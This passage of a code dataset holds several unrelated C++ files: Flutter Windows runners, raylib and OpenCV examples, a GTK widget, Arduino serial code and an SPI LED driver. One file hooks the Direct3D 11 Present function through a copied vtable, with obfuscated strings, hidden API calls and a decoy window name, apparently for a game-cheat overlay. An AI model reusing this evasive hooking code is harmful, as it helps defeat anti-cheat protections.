300000000));\n\tpool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\tpool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\tpool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\tpool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\tULong sum1 = res1.get().cast_<ULong>();\n\tULong sum2 = res2.get().cast_<ULong>();\n\tULong sum3 = res3.get().cast_<ULong>();\n\n\t*/\n\n\n\t/*\n\t//Test2\n\tThreadPool pool;\n\tpool.start(4);\n\n\tResult res1 = pool.submitTask(std::make_shared<MyTask>(1, 100000000));\n\tResult res2 = pool.submitTask(std::make_shared<MyTask>(100000001, 200000000));\n\tResult res3 = pool.submitTask(std::make_shared<MyTask>(200000001, 300000000));\n\n\tULong sum1 = res1.get().cast_<ULong>();\n\tULong sum2 = res2.get().cast_<ULong>();\n\tULong sum3 = res3.get().cast_<ULong>();\n\n\tstd::cout << (sum1+ sum2+ sum3) << std::endl;\n\t*/\n\n\t/*\n\tTest1\n\tThreadPool pool;\n\tpool.start(4);\n\tpool.submitTask(std::make_shared<Tak>());\n\tpool.submitTask(std::make_shared<Tak>());\n\tpool.submitTask(std::make_shared<Tak>());\n\tpool.submitTask(std::make_shared<Tak>());\n\tsystem(\"pause\");\n\t*/\n\treturn 0;\n}",
    "#include <iostream>\n#include <vector>\n#include <opencv2/opencv.hpp>\n\n/**\n * @brief Creates a color map with N entries, mapping M RGB colors to gray tones.\n *\n * @param M The number of RGB colors.\n * @param N The number of entries in the color map.\n * @return A 2D vector representing the color map.\n */\nstd::vector<std::vector<int>> createColorMap(int M, int N)\n{\n  std::vector<std::vector<int>> colorMap(N, std::vector<int>(3));\n  int step = M / N;\n  int grayTone;\n\n  for (int i = 0; i < N; ++i)\n  {\n    grayTone = i * step;\n    colorMap[i][0] = grayTone;\n    colorMap[i][1] = grayTone;\n    colorMap[i][2] = grayTone;\n  }\n\n  return colorMap;\n}\n\n/**\n * @brief Main function.\n */\nint main()\n{\n  int M = 256;\n  int N = 100;\n\n  std::vector<std::vector<int>> colorMap = createColorMap(M, N);\n\n  std::cout << std::endl\n            << \"Color-map result:\" << std::endl\n            << std::endl;\n  for (int i = 0; i < N; ++i)\n  {\n    std::cout << \"Entry \" << i << \": (\" << colorMap[i][0] << \", \" << colorMap[i][1] << \", \" << colorMap[i][2] << \");\" << std::endl;\n  }\n\n  std::cout << std::endl;\n\n  cv::Mat image(100, 100, CV_8UC3);\n  for (int i = 0; i < N; ++i)\n  {\n    for (int j = 0; j < N; ++j)\n    {\n      image.at<cv::Vec3b>(i, j)[0] = colorMap[j][0];\n      image.at<cv::Vec3b>(i, j)[1] = colorMap[j][1];\n      image.at<cv::Vec3b>(i, j)[2] = colorMap[j][2];\n    }\n  }\n\n  cv::imwrite(\"../images/color-map.png\", image);\n  cv::waitKey(0);\n\n  return 0;\n}\n",
    "#include \"Socket.h\"\r\n#include \"Node.h\"\r\n\r\n\r\nSocket::Socket(int col, int row, Type type, Data data) : col(col), row(row), type(type), data(data)\r\n{\r\n}\r\n\r\n\r\nvoid Socket::snapshot_vfunc(const Glib::RefPtr<Gtk::Snapshot>& snapshot){\r\n\r\n    double outer_radius_ = 7.0;\r\n    double inner_radius_ = 2.0;\r\n    Gdk::Rectangle bounds_outer(0 - outer_radius_, 0 - outer_radius_, outer_radius_ * 2, outer_radius_ * 2);\r\n    auto cr_outer = snapshot->append_cairo(bounds_outer);\r\n    \r\n    // Draw the outer circle\r\n    cr_outer->arc(x_, y_, outer_radius_, 0, 2 * M_PI);\r\n    if(type == Socket::Type::INPUT) cr_outer->set_source_rgba(0,0,0,0.7);   \r\n    else cr_outer->set_source_rgba(0,0,0,0.7);\r\n    cr_outer->fill(); \r\n    \r\n    cr_outer->stroke();\r\n    \r\n    /*Gdk::Rectangle bounds_inner(0 - inner_radius_, 0 - inner_radius_, inner_radius_ * 2, inner_radius_ * 2);\r\n    auto cr_inner = snapshot->append_cairo(bounds_inner);\r\n\r\n    // Draw the inner circle (fill)\r\n    cr_inner->arc(x_, y_, inner_radius_, 0, 2 * M_PI);\r\n    cr_inner->set_source_rgb(1,1,1); // Use a visible color for testing    \r\n    \r\n    cr_inner->fill(); \r\n    \r\n    cr_inner->stroke()*/\r\n}\r\n\r\nvoid Socket::set_x(double x1){\r\n    x_ = x1;\r\n    \r\n}\r\nvoid Socket::set_y(double y1){\r\n    y_ = y1;\r\n    \r\n}\r\n\r\nbool Socket::is_inside(double x1,double y1){\r\n    auto a = get_allocation();    \r\n    return x1 >= a.get_x() - 5 && x1 <= a.get_y() + 5 && y1 >= a.get_y() - 5 && y1 <= a.get_y() + 5;\r\n}\r\n\r\ndouble Socket::get_x(){\r\n    double x_ = get_allocation().get_x();    \r\n    return x_;\r\n}\r\ndouble Socket::get_y(){\r\n    double y_ = get_allocation().get_y();       \r\n    //double y_ = s.get_y() + parent_node_->get_allocation().get_y();\r\n    //double y = s.get_y() + a.get_y();        \r\n    return y_;\r\n}\r\n\r\nstd::string Socket::get_data(){\r\n\r\n    int adjcol = (type == Socket::Type::INPUT) ? col + 1 : col - 1;\r\n\r\n    auto* grid_parent = dynamic_cast<Gtk::Grid*>(get_parent());\r\n    if (!grid_parent) {\r\n        std::cerr << \"Failed to get grid parent\\n\";\r\n        return \"\";\r\n    }\r\n\r\n    auto* element = grid_parent->get_child_at(adjcol, row);\r\n    if (!element) {\r\n        std::cerr << \"Failed to get element at position\\n\";\r\n        return \"\";\r\n    }\r\n    \r\n    if (data == Socket::Data::CHECK) {\r\n        auto* check_button = dynamic_cast<Gtk::CheckButton*>(element);\r\n        if (!check_button) {\r\n            std::cerr << \"Element is not a Gtk::CheckButton\\n\";\r\n            return \"\";\r\n        }\r\n        if (check_button) {\r\n            return std::to_string(check_button->get_active());\r\n        }\r\n    } else if (data == Socket::Data::SPIN) {\r\n        auto* spin_button = dynamic_cast<Gtk::SpinButton*>(element);\r\n        if (spin_button) {\r\n            return std::to_string(spin_button->get_value());\r\n        }\r\n    } else if (data == Socket::Data::SWITCH) {\r\n        auto* switch_widget = dynamic_cast<Gtk::Switch*>(element);\r\n        if (switch_widget) {\r\n            return std::to_string(switch_widget->get_state());\r\n        }\r\n    } else if (data == Socket::Data::COLOR) {\r\n        auto* color_button = dynamic_cast<Gtk::ColorButton*>(element);\r\n        if (color_button) {\r\n            return color_button->get_rgba().to_string();\r\n        }\r\n    }\r\n    return \"\";\r\n}\r\n\r\nint Socket::get_row(){\r\n    return row;\r\n}\r\nint Socket::get_col(){\r\n    return col;\r\n}\r\nSocket::Type Socket::get_type(){\r\n    return type;\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"tinker_alarm\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*******************************************************************************************\n*\n*   raylib [textures] example - Retrieve image data from texture: LoadImageFromTexture()\n*\n*   NOTE: Images are loaded in CPU memory (RAM); textures are loaded in GPU memory (VRAM)\n*\n*   Example originally created with raylib 1.3, last time updated with raylib 4.0\n*\n*   Example licensed under an unmodified zlib/libpng license, which is an OSI-certified,\n*   BSD-like license that allows static linking with closed source software\n*\n*   Copyright (c) 2015-2024 Ramon Santamaria (@raysan5)\n*\n********************************************************************************************/\n\n#include \"raylib.h\"\n\n//------------------------------------------------------------------------------------\n// Program main entry point\n//------------------------------------------------------------------------------------\nint main(void)\n{\n    // Initialization\n    //--------------------------------------------------------------------------------------\n    const int screenWidth = 800;\n    const int screenHeight = 450;\n\n    InitWindow(screenWidth, screenHeight, \"raylib [textures] example - texture to image\");\n\n    // NOTE: Textures MUST be loaded after Window initialization (OpenGL context is required)\n\n    Image image = LoadImage(\"assets/raylib_logo.png\");  // Load image data into CPU memory (RAM)\n    Texture2D texture = LoadTextureFromImage(image);       // Image converted to texture, GPU memory (RAM -> VRAM)\n    UnloadImage(image);                                    // Unload image data from CPU memory (RAM)\n\n\n    image = LoadImageFromTexture(texture);                 // Load image from GPU texture (VRAM -> RAM)\n    UnloadTexture(texture);                                // Unload texture from GPU memory (VRAM)\n\n    texture = LoadTextureFromImage(image);                 // Recreate texture from retrieved image data (RAM -> VRAM)\n    UnloadImage(image);                                    // Unload retrieved image data from CPU memory (RAM)\n    //---------------------------------------------------------------------------------------\n\n    // Main game loop\n    while (!WindowShouldClose())    // Detect window close button or ESC key\n    {\n        // Update\n        //----------------------------------------------------------------------------------\n        // TODO: Update your variables here\n        //----------------------------------------------------------------------------------\n\n        // Draw\n        //----------------------------------------------------------------------------------\n        BeginDrawing();\n\n            ClearBackground(RAYWHITE);\n\n            DrawTexture(texture, screenWidth/2 - texture.width/2, screenHeight/2 - texture.height/2, WHITE);\n\n            DrawText(\"this IS a texture loaded from an image!\", 300, 370, 10, GRAY);\n\n        EndDrawing();\n        //----------------------------------------------------------------------------------\n    }\n\n    // De-Initialization\n    //--------------------------------------------------------------------------------------\n    UnloadTexture(texture);       // Texture unloading\n\n    CloseWindow();                // Close window and OpenGL context\n    //--------------------------------------------------------------------------------------\n\n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"project_1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include <iostream>\nusing namespace std;\nint Sum(int a, int b);    // \u041f\u0440\u043e\u0442\u043e\u0442\u0438\u043f \u0444\u0443\u043d\u043a\u0446\u0438\u0438 (\u041e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 - Function declaration)\nint Diff(int a, int b);\nint Prod(int a, int b);\ndouble Quot(int a, int b);\nlong long int Factorial(int a);\ndouble Power(double a, int b);\n\n//#define CALC\n//#define FACTORIAL\n#define POWER\n\nvoid main()\n{\n\tsetlocale(LC_ALL, \"\");\n#ifdef CALC\n\n\tcout << \"Hello Functions\" << endl;\n\tint a, b;\n\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0434\u0432\u0430 \u0447\u0438\u0441\u043b\u0430: \"; cin >> a >> b;\n\tint c = Sum(a, b);    // \u0412\u044b\u0437\u043e\u0432 \u0438\u043b\u0438 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u2013 Function call\n\tcout << a << \" + \" << b << \" = \" << c << endl;\n\tcout << a << \" - \" << b << \" = \" << Diff(a, b) << endl;\n\tcout << a << \" * \" << b << \" = \" << Prod(a, b) << endl;\n\tcout << a << \" / \" << b << \" = \" << Quot(a, b) << endl;\n#endif // CALC\n\n#ifdef FACTORIAL\n\tint n;\n\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0447\u0438\u0441\u043b\u043e: \"; cin >> n;\n\tcout << Factorial(n) << endl;\n#endif // FACTORIAL\n\n#ifdef POWER\n\tint a,b;\n\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043e\u0441\u043d\u043e\u0432\u0430\u043d\u0438\u0435 \u0441\u0442\u0435\u043f\u0435\u043d\u0438: \"; cin >> a;\n\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u043e\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u0441\u0442\u0435\u043f\u0435\u043d\u0438: \"; cin >> b;\n\tcout << a << \" ^ \" << b << \" = \" << Power(a, b) << endl;\n#endif // POWER\n}\n    //Calc\n\tint Sum(int a, int b) //\u0420\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u0438 (\u041e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u0435 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 -Function definition) \n\t{\n\t\tint c = a + b;\n\t\treturn c;\n\t}\n\tint Diff(int a, int b)\n\t{\n\t\treturn a - b;\n\t}\n\tint Prod(int a, int b)\n\t{\n\t\treturn a * b;\n\t}\n\tdouble Quot(int a, int b)\n\t{\n\t\treturn (double)a / b;\n\t}\n\t// Factorial\n\tlong long int Factorial(int n)\n\t{\n\t\tlong long int fact = 1;\n\t\tfor (int i = 1; i <= n; i++)\n\t\t{\n\t\t\tfact *= i;\n\t\t}\n\t\treturn fact;\n\t}\n\t// Power\n\tdouble Power(double a, int n)\n\t{\n\t\tdouble N = 1;\n\t\tif (n < 0)\n\t\t{\n\t\t\ta = 1 / a;\n\t\t\tn = -n;\n\t\t}\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tN *= a;\n\t\t}\n\t\treturn N;\n\t}",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "/*\n  HardwareSerial3.cpp - Hardware serial library for Wiring\n  Copyright (c) 2006 Nicholas Zambetti.  All right reserved.\n\n  This library is free software; you can redistribute it and/or\n  modify it under the terms of the GNU Lesser General Public\n  License as published by the Free Software Foundation; either\n  version 2.1 of the License, or (at your option) any later version.\n\n  This library is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n  Lesser General Public License for more details.\n\n  You should have received a copy of the GNU Lesser General Public\n  License along with this library; if not, write to the Free Software\n  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n\n  Modified 23 November 2006 by David A. Mellis\n  Modified 28 September 2010 by Mark Sproul\n  Modified 14 August 2012 by Alarus\n  Modified 3 December 2013 by Matthijs Kooijman\n*/\n\n#include \"Arduino.h\"\n#include \"HardwareSerial.h\"\n#include \"HardwareSerial_private.h\"\n\n// Each HardwareSerial is defined in its own file, since the linker pulls\n// in the entire file when any element inside is used. --gc-sections can\n// additionally cause unused symbols to be dropped, but ISRs have the\n// \"used\" attribute so are never dropped and they keep the\n// HardwareSerial instance in as well. Putting each instance in its own\n// file prevents the linker from pulling in any unused instances in the\n// first place.\n\n#if defined(HAVE_HWSERIAL3)\n\nISR(USART3_RX_vect)\n{\n  Serial3._rx_complete_irq();\n}\n\nISR(USART3_UDRE_vect)\n{\n  Serial3._tx_udr_empty_irq();\n}\n\nHardwareSerial Serial3(&UBRR3H, &UBRR3L, &UCSR3A, &UCSR3B, &UCSR3C, &UDR3);\n\n// Function that can be weakly referenced by serialEventRun to prevent\n// pulling in this file if it's not otherwise used.\nbool Serial3_available() {\n  return Serial3.available();\n}\n\n#endif // HAVE_HWSERIAL3\n",
    "#include \"NeoSPI.h\"\n#include <vector>\n#include <cstring>\n#include <linux/spi/spidev.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/ioctl.h>\n\nbool NeoSPI::spiOpen(string dev)\n{\n  if((spi_fd = open(dev.c_str(), O_RDWR)) < 0) // Trying to open spi device\n  {\n    printf(\"error opening %s\\n\",dev); // Crying when it doesn't work\n    return false;\n  }\n  return true; // Or just be happy :)\n}\n\nvoid NeoSPI::writeBuff() // It just works but I have no idea how... \ud83e\udd37\n{\n  struct spi_ioc_transfer spi; // A lot of complicated SPI stuff\n  memset (&spi, 0, sizeof(spi)); // Reserving memmory for SPI\n  spi.tx_buf = reinterpret_cast<unsigned long>(rawData.data());    //(unsigned long)rawData; // Converts the array to a single long value\n  spi.len = numPixels*24; // Calculates the SPI message length\n  spi.delay_usecs = SPI_delay;\n  spi.speed_hz = SPIspeed; // Sets the precise SPI speed\n  spi.bits_per_word = SPI_BPW;\n  ioctl(spi_fd, SPI_IOC_MESSAGE(1), &spi); // Gives all the infos to the linux kernel for processing\n}\n\nbool NeoSPI::int2Bool(uint8_t input, int digit)\n{\n   switch(digit) { // Split the uint8_t into individual bits in reverse direction\n    case 7:\n      return input & 0x01;\n      break;\n    case 6:\n      return input & 0x02;\n      break;\n    case 5:\n      return input & 0x04;\n      break;\n    case 4:\n      return input & 0x08;\n      break;\n    case 3:\n      return input & 0x10;\n      break;\n    case 2:\n      return input & 0x20;\n      break;\n    case 1:\n      return input & 0x40;\n      break;\n    case 0:\n      return input & 0x80;\n      break;\n  }\n  return false;\n}\n\nvector<uint8_t> NeoSPI::int2NeoPixel(uint8_t val)\n{\n  int cnt = 0; // Initialize a counter with 7\n  vector<uint8_t> color(8); // Initialize the array with 8 values for the 8 bits\n  color = std::vector<uint8_t>(8, 0xC0); // Fill the LOW bytes in with the SPI BitBang bytes\n  while (cnt < 8) // Count through evrey bit of a byte\n  {\n    if (int2Bool(val, cnt)) color.at(cnt) = 0xF8; // Fill the HIGH bytes in with the SPI BitBang bytes\n    cnt++;\n  }\n  return color;\n}\n\nvector<uint8_t> NeoSPI::RGB2BitBang(uint8_t r, uint8_t g, uint8_t b)\n{\n  vector<uint8_t> r_array = int2NeoPixel(r); // Get the SPI bytes for the red channel\n  vector<uint8_t> g_array = 